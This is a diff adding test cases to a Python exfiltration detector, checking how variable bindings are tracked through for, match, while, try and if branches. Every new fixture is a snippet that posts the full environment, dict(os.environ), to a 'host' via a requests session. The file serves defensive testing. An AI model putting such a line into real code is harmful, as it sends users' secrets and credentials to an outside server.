@@ -1433,6 +1433,20 @@ def test_python_client_handle_binding_matches_runtime(tmp_path: Path, source: st
         ("value = [1]\n", "import os\nimport requests\n\ns = requests.Session()\nmatch value:\n    case [s]:\n        s.post(host, json=dict(os.environ))\n", [], False),
         # A handler's `as` name is the same case: it shadows the handle for its own body.
         ("", "import os\nimport requests\n\ns = requests.Session()\ntry:\n    float('x')\nexcept Exception as s:\n    s.post(host, json=dict(os.environ))\n", [], False),
+        # The header is evaluated *before* the dispatch-time binding exists, so a sink there runs
+        # under the enclosing handle even when the target/capture reuses that name.
+        ("", "import os\nimport requests\n\ns = requests.Session()\nfor s in s.post(host, json=dict(os.environ)):\n    pass\n", ["client"], True),
+        ("", "import os\nimport requests\n\ns = requests.Session()\nmatch s.post(host, json=dict(os.environ)):\n    case [s]:\n        pass\n", ["client"], True),
+        # ... and the inverse, which is why the dispatch names are still dropped before the body:
+        # inside the body `s` is the loop value, not the handle.
+        ("", "import os\nimport requests\n\ns = requests.Session()\nfor s in [1]:\n    s.post(host, json=dict(os.environ))\n", [], False),
+        # Two levels of branching: the branches are mutually exclusive, so a rebind in the `if` body
+        # cannot retract a sink in the `elif` body.
+        ("a = False\nb = True\n", "import os\nimport requests\n\ns = requests.Session()\nif a:\n    s = config\nelif b:\n    s.post(host, json=dict(os.environ))\n", ["client"], True),
+        # A `while` body is the first thing its statement runs, same rule as `for`.
+        ("flag = True\n", "import os\nimport requests\n\ns = requests.Session()\nwhile flag:\n    s.post(host, json=dict(os.environ))\n    flag = False\n    s = config\n", ["client"], True),
+        # A `try` `else` always follows the body, so the body's rebind must reach it.
+        ("", "import os\nimport requests\n\ns = requests.Session()\ntry:\n    s = config\nexcept Exception:\n    pass\nelse:\n    s.post(host, json=dict(os.environ))\n", ["config"], False),
     ],
 )
 def test_python_branch_bodies_are_walked_without_leaking_bindings(tmp_path: Path, prelude: str, source: str, receivers: list[str], is_exfil: bool) -> None:
